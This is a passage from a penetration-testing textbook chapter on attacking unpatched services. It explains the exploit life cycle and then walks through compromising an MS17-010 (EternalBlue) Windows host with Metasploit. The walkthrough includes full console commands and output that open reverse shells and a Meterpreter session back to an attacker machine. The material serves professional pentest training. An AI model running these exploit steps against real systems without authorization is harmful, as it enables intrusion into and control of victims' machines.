scenario, imagine that there are eight tiny holes on the bottom of the card reader, and
if you poke a bent paper clip into two specific holes at just the right angle and apply
pressure in just the right way, the door unlocks. 
 The panel manufacture was made aware of this design flaw and has since
addressed the issue in the latest model’s design, but replacing all the door locks in a
large facility can be very expensive. Instead, the building managers installed an
adapter plate that securely attaches to the panel and blocks access to the two holes.
The only way to remove the plate would be to physically break the device, which would
most likely set off an alarm. Luckily, when the team inspects each door and its respec-
tive keycard control panel, they identify a single door that is missing the adapter.
Because this one door is essentially unpatched, the crew is more or less able to walk
right in—presuming, of course, that they possess a carefully bent paperclip.
 I admit, this hypothetical movie plot is starting to become a bit unreasonable. It
certainly doesn’t make for an entertaining break-in if all the “bad guys” have to do is
bend a paper clip and stick it into two holes to access a top-secret facility. It almost
seems too good to be true that they would stumble on a door that might as well be
unlocked because the knowledge of this bypass technique is commonly known
(among thieves, at least).
 The only reasonable explanation for the presence of this seemingly unlocked door
in an otherwise secured facility is that the maintenance team missed it when they were
fixing (patching) all the other doors by installing the adapter on the keycard locking
mechanisms. Maybe the company in charge of the building’s security contracted out
the panel upgrades to a third party that cut corners and hired cheap labor to do the
job. Somebody was trying to get home early and rushed through the work, acciden-
tally missing one of the doors. That happens all the time in enterprise networks when
it comes to applying critical security updates to computer systems. Plus, as mentioned
in chapter 1, companies are often missing an accurate, up-to-date asset catalog with
details of every computer device on the network, so when a critical patch comes out
and everyone is rushing to update all their systems, it’s not uncommon for one or
more to slip through the cracks.
7.1
Understanding software exploits
Unpatched services are missing updates that provide fixes for what most people refer
to as software bugs. These bugs can sometimes be used by an attacker to compromise
the affected service and take control of the host-level OS. Loosely defined, a software
bug is any piece of code that fails to operate as intended when an unpredicted input is
passed to a given function. If the software bug causes the application or service to
crash (quit working), then it may be possible to hijack the application’s execution flow
and execute arbitrary machine language instructions on the computer system run-
ning the vulnerable application.
120
CHAPTER 7
Attacking unpatched services
 The process of writing a small computer program (an exploit) to take advantage of
a software bug in such a way that it produces remote code execution is typically
referred to as software exploitation or exploit development. This chapter does not cover the
details of developing a software exploit as it is an advanced topic, to say the least, and
is outside the scope of this text. Still, it is important to understand the concepts
involved in software exploitation to better grasp how you can use publicly available
exploits on an internal network penetration test (INPT). If you want to learn more
about exploit development, I strongly recommend that you pick up a copy of Hacking:
The Art of Exploitation by Jon Erickson (No Starch Press, 2nd ed. 2008).
 In the pages that follow, you’ll learn the high-level details of a famous software bug
affecting Microsoft Windows systems: MS17-010, codenamed Eternal Blue. I will also
demonstrate how to use a publicly available open source exploit module within the
Metasploit framework to take control of a vulnerable system that is missing the patch
for this software bug. You will learn the difference between a bind and a reverse shell
payload and become acquainted with a powerful exploit payload called the Meter-
preter shell.
7.2
Understanding the typical exploit life cycle 
How do software bugs and exploits come to exist in the first place? Maybe you’ve
heard about Patch Tuesday, when new Microsoft Windows patches come out. How are
those patches developed, and why? The answer can vary, but generally speaking, in the
instance of security-related updates, events usually happen in the following order. 
 First, an independent security researcher who wouldn’t mind in the least if you
referred to him as a hacker (that’s probably how he refers to himself) performs rigor-
ous stress testing and discovers an exploitable software bug in a commercial software
product like Microsoft Windows. Exploitable means not only that the bug causes a crash
but also that the hacker can provide data to the application in such a way that once the
crash is triggered, key areas of the program’s virtual memory space can be overwritten
with specific instructions to control the execution flow of the vulnerable software.
The hacker in our example is more or less a “good guy.” After polishing the working
exploit to fully demonstrate the severity of the bug, he chooses to responsibly disclose
Bugs are discovered, not created
Security bugs exist in all computer programs. This is due to the nature of how soft-
ware is developed rapidly by companies with the intention of hitting shareholder-
driven deadlines and profit targets. Security is often an afterthought. 
Hackers do not create bugs or introduce them into software. Instead, through various
forms of reverse engineering and also stress testing, sometimes called fuzzing, hack-
ers discover or identify bugs that were unintentionally placed there by software devel-
opers who were working around the clock to hit their release date.
121
Compromising MS17-010 with Metasploit
the vulnerability to the vendor that created the software. In the case of Eternal Blue,
the vendor is, of course, the Microsoft Corporation. 
NOTE
In some cases, a researcher may be handsomely rewarded financially
for disclosing a vulnerability. The reward is called a bug bounty. An entire com-
munity of freelance hackers (bug bounty hunters) spend their careers discov-
ering, exploiting and then disclosing software bugs and collecting bounties
from vendors. If this is something you are interested in learning more about,
you should check out two of the most popular freelance bug bounty pro-
grams: https:/hackerone.com and https://bugcrowd.com.
When Microsoft receives the initial bug disclosure and a proof-of-concept (PoC)
exploit from the security researcher, it has its own internal research team investigate
the bug to be sure it is legitimate. If the bug is verified, Microsoft creates a security
advisory and issues a patch that customers can download and use to fix the vulnerable
software. The Eternal Blue bug was disclosed in 2017 and was the tenth verified bug to
receive a patch that year. As such, following Microsoft’s naming convention, the patch
(and later the publicly available exploit) will be forever known as MS17-010.
 Once the patch is released to the public, it becomes publicly available knowledge.
Even if Microsoft tries to limit the information provided in the advisory, the patch can
be downloaded and analyzed by security researchers to determine which code is being
fixed and thus what code is vulnerable to software exploitation. Not long after that, an
open source exploit (or 10) usually becomes available to the public. 
 This is enough information to move forward with the chapter; however, if you
would like to learn specific details about MS17-010, including the technical details of
the software bug, the patch, and how the exploit works, I encourage you to start by
watching a great talk from Defcon 26 called “Demystifying MS17 010: Reverse Engi-
neering the ETERNAL Exploits” presented by a hacker by the name of zerosum0x0.
You can watch it at https://www.youtube.com/watch?v=HsievGJQG0w.
7.3
Compromising MS17-010 with Metasploit
The conditions necessary to successfully use an exploit to gain a remote shell vary in
complexity depending on the type of software that is vulnerable and the nature of the
bug being exploited. Again, I’m not going to dive too deep into the process of exploit
development or the intricate details of different types of software bugs, buffer over-
flows, heap overflows, race conditions, and so forth. I do want to point out, though,
that different types of software vulnerabilities need to be exploited in different ways.
Some are easier than others; as attackers, we are most interested in exploits that
require the least amount of interaction from the target machine.
 For example, a bug in Microsoft Word may require you to convince a victim to
open a malicious document and click Yes at a prompt that asks to run a malicious
macro, which then triggers the exploit. This requires user interaction and thus is less
ideal for an attacker, especially one who is attempting to remain undetected. From an
122
CHAPTER 7
Attacking unpatched services
attacker’s perspective, the ultimate exploitable bugs affect passively listening software
services and require no user interaction to exploit. 
 MS17-010 is precisely that type of bug because it affects the Microsoft Windows
CIFFS/SMB service that listens by default on TCP port 445 on all domain-joined Win-
dows systems. Reliably exploitable bugs on passively listening Windows services are
rare, and as a result, you can usually expect to see tons of blog posts and a working
Metasploit module shortly after Microsoft releases a patch. To illustrate what a rare
gem MS17-010 is, the last equivalent bug to hit Windows systems was released nine years
earlier, in 2008: MS08-067, which was used in the highly publicized Conficker Worm.
7.3.1
Verifying that the patch is missing
Now that you are familiar with how valuable MS17-010 is from an attacker’s perspective,
let’s get back to the discussion of exploiting the missing patch and gaining a shell on the
vulnerable target. As a recap from chapter 4 on discovering network vulnerabilities, a
vulnerable host was identified as missing the MS17-010 patch by using the auxiliary mod-
ule from Metasploit. Here is a reminder of how that was discovered: launch the msfcon-
sole, navigate to the auxiliary scan module by typing use auxiliary/scanner/smb/
smb_ms17_010 at the prompt, set the target rhosts value with set rhosts 10.0.10.227,
and type run to run the module.
msf5 > use auxiliary/scanner/smb/smb_ms17_010 
msf5 auxiliary(scanner/smb/smb_ms17_010) > set rhosts 10.0.10.227
rhosts => 10.0.10.227
msf5 auxiliary(scanner/smb/smb_ms17_010) > run
[+] 10.0.10.227:445       - Host is likely VULNERABLE to MS17-010! –
Windows Server (R) 2008 Enterprise 6001 Service Pack 1 x86 (32-bit)
[*] 10.0.10.227:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/smb_ms17_010) >
The output from the module confirms that the host is probably missing the patch and
is therefore likely vulnerable to the exploit module, which can be used to compromise
the target system and obtain a reverse shell command prompt to control the OS. The
only way to know for sure would be to try the exploit module. 
 If you’re wondering why the exploit author chose to word the detection as “likely
vulnerable,” it’s simply because there are rare cases when a patch was partially
installed and failed midway through, causing the service to appear vulnerable when it
is not. This doesn’t happen often; if the module says the host is “likely vulnerable,”
that’s because it is likely vulnerable, which is to say that it probably is vulnerable. As a
pentester, you have to be confident, so you’ll need to run the exploit module to verify.
 Since you’ll be using a reverse shell payload for this attack vector, you need to
know what your IP address is on the target network. Metasploit will then tell the victim
Listing 7.1
Verifying the target is exploitable
123
Compromising MS17-010 with Metasploit
machine what your IP address is when it launches the payload via the exploit so the
target system can connect back to your attacking machine. 
 OS commands can be run directly from within the msfconsole, so there is no need
to exit the console to check your IP address. If I run the ifconfig command, it tells
me that my IP address is 10.0.10.160; this will, of course, be different for you depend-
ing on your network configuration.
msf5 auxiliary(scanner/smb/smb_ms17_010) > ifconfig
[*] exec: ifconfig
ens33: flags=4163  mtu 1500
        inet 10.0.10.160    
        netmask 255.255.255.0  broadcast 10.0.10.255
        inet6 fe80::3031:8db3:ebcd:1ddf  prefixlen 64  scopeid 0x20
        ether 00:0c:29:d8:0f:f2  txqueuelen 1000  (Ethernet)
        RX packets 1402392  bytes 980983128 (980.9 MB)
        RX errors 0  dropped 1  overruns 0  frame 0
        TX packets 257980  bytes 21886543 (21.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
lo: flags=73  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 210298  bytes 66437974 (66.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 210298  bytes 66437974 (66.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
msf5 auxiliary(scanner/smb/smb_ms17_010) >
Once you have your IP address, you can load the MS17-010 exploit module. Do this by
typing use exploit/windows/smb/ms17_010_psexec. You’ll notice that the module
begins with exploit instead of auxiliary. Exploit modules have a few different options
than the auxiliary modules we’ve used so far throughout this book. Because this is an
exploit module, you have to specify an additional parameter: the payload you want to
execute on the vulnerable host. 
Listing 7.2
Checking for the localhost IP address
Why a reverse shell?
Every exploit requires a payload to be executed on the target system once the vulner-
ability is triggered. Payloads are almost always some type of command-line interface
to the target. At a high level, your payload can be either a bind payload, which opens
a network port on the target machine for you to connect to and receive your shell, or
a reverse payload, which connects back to your attacking machine. In general, pen-
testers prefer a reverse shell payload because it gives them more control over the
server listening for connections and is therefore more reliable in practice.
The IP address of 
my Linux attacking 
machine
124
CHAPTER 7
Attacking unpatched services
7.3.2
Using the ms17_010_psexec exploit module
First, tell Metasploit which host you’re targeting with set rhost 10.0.10.208. This
should be the IP address of the vulnerable Windows server. Then tell the module
which payload you’re going to use. You’ll use a simple reverse TCP shell for starters:
type set payload windows/x64/shell/reverse_tcp. Because this is a reverse pay-
load, you need to specify a new variable called lhost for localhost. This is the IP
address that the target server will connect back to, to receive the payload. So, I’ll type
set lhost 10.0.10.160. You would type the same command, but change the IP
address to the one matching your attacking machine. Now you can launch the exploit
module simply by typing the exploit command. When it’s finished, you will be greeted
with a familiar Windows command prompt.
msf5 > use exploit/windows/smb/ms17_010_psexec 
msf5 exploit(windows/smb/ms17_010_psexec) > set rhost 10.0.10.208
rhost => 10.0.10.208
msf5 exploit(windows/smb/ms17_010_psexec) > set payload
windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf5 exploit(windows/smb/ms17_010_psexec) > set lhost 10.0.10.160
lhost => 10.0.10.160
msf5 exploit(windows/smb/ms17_010_psexec) > exploit
[*] Started reverse TCP handler on 10.0.10.160:4444 
[*] 10.0.10.208:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.0.10.208:445 - Built a write-what-where primitive...
[+] 10.0.10.208:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.0.10.208:445 - Selecting PowerShell target
[*] 10.0.10.208:445 - Executing the payload...
[+] 10.0.10.208:445 - Service start timed out, OK if running a command or
non-service executable...
[*] Sending stage (336 bytes) to 10.0.10.208
[*] Command shell session 1 opened (10.0.10.160:4444 -> 10.0.10.208:49163)
at 2019-10-08 15:34:45 -0500
C:\Windows\system32>ipconfig
ipconfig
Windows IP Configuration
Ethernet adapter Local Area Connection:
   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::9458:324b:1877:4254%11
   IPv4 Address. . . . . . . . . . . : 10.0.10.208
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.10.1
Listing 7.3
Using the MS17-010 exploit module
125
The Meterpreter shell payload
Tunnel adapter isatap.{4CA7144D-5087-46A9-8DC2-1BE5E36C53BB}:
   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
C:\Windows\system32>
WARNING
No matter how stable the exploit, systems can and do sometimes
crash. You should use extreme caution when performing an exploit against a
production system while doing an INTP. As a rule of practice, you should notify
your client contact before doing so. No need to alarm them; just say that you’ve
identified a directly exploitable vulnerability and need to make sure the host is
in fact vulnerable. There is a greater-than-0% chance that the exploit could
cause the system to crash. In the case of MS17-010, in the worst-case scenario
where the system does crash, the system will usually reboot automatically.
7.4
The Meterpreter shell payload
The next step after compromising vulnerable systems would be to harvest valuable
information from this compromised target, such as the local user account password
hashes, as we did in the previous chapter. But as I have shown you, this process can be
a little tedious, to say the least, because there is currently no way to download files
directly from the compromised target. 
 Rather than use the previously demonstrated technique of creating SYSTEM and
SAM registry hive copies, opening an insecure file share, and connecting to it from
your attacking machine, I’d like to take this opportunity to introduce you to a more
robust reverse shell than an ordinary Windows command prompt: one that contains a
built-in upload/download capability as well as an array of other useful features. I’m
talking, of course, about the awesome Meterpreter shell from Metasploit.
 Typing exit from the Windows command prompt will kill your reverse shell and
place you back in the msfconsole. Your access to the vulnerable target is now gone. If
you needed to access the system again, you would have to rerun the exploit. Running
an exploit too many times is not advised as it can sometimes cause systems to crash—
and I’m sure you can imagine how excited clients are when that happens. Just for illus-
tration, run the exploit one more time, but specify a Meterpreter reverse shell payload
by typing set payload windows/x64/meterpreter/reverse_https and then running
the exploit command again.
msf5 exploit(windows/smb/ms17_010_psexec) > set payload
windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf5 exploit(windows/smb/ms17_010_psexec) > exploit
[*] Started HTTPS reverse handler on https://10.0.10.160:8443
[*] 10.0.10.208:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
Listing 7.4
Getting a Meterpreter shell
126
CHAPTER 7
Attacking unpatched services
[*] 10.0.10.208:445 - Built a write-what-where primitive...
[+] 10.0.10.208:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.0.10.208:445 - Selecting PowerShell target
[*] 10.0.10.208:445 - Executing the payload...
[+] 10.0.10.208:445 - Service start timed out, OK if running a command or
non-service executable...
[*] https://10.0.10.160:8443 handling request from 10.0.10.208; (UUID:
fv1vv10x) Staging x64 payload (207449 bytes) ...
[*] Meterpreter session 3 opened (10.0.10.160:8443 -> 10.0.10.208:49416) at
2019-10-09 11:41:05 -0500
meterpreter >
This should look familiar from the last time you ran the exploit, with one key differ-
ence: instead of a Windows command prompt, you should be looking at what’s called
a Meterpreter session or Meterpreter shell. The Meterpreter payload was originally developed
for Metasploit 2.0 and remains a popular reverse shell payload for hackers and pentest-
ers alike. For an overwhelming introduction to the Meterpreter shell’s many features,
type the help command, and several screen lengths of commands will scroll by.
NOTE
Be sure to add the Meterpreter shell to your engagement notes. It is an
initial compromise and a shell connection, which you will need to be destroy
properly during post-engagement cleanup. 
meterpreter > help
Core Commands
=============